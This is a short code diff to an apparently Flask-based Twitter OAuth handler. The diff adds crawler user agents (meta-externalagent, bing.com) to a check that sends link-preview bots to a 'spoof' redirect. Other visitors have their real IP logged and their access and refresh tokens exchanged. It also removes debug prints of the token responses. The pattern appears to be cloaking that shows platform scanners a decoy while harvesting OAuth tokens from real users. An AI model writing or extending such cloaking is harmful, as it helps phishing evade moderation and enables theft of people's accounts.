@@ -52,7 +52,7 @@ def oauth():
     
     session["group_id"] = group.get("group_id")
     
-    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
+    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent or 'meta-externalagent' in user_agent or 'bing.com' in user_agent:
         return redirect(spoof)
 
     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
@@ -162,7 +162,6 @@ def exchange_token_for_access(authorization_code):
         'Content-Type': 'application/x-www-form-urlencoded',
     }
     response = requests.post(token_exchange_url, data=request_data, headers=headers)
-    print(response.json())
     return response.json().get('access_token'), response.json().get('refresh_token')
 
 
@@ -175,7 +174,6 @@ def get_twitter_user_data(access_token):
         'user.fields': 'public_metrics'
     }
     response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
-    print(response.json())
     return response.json().get('data', {})
     
     
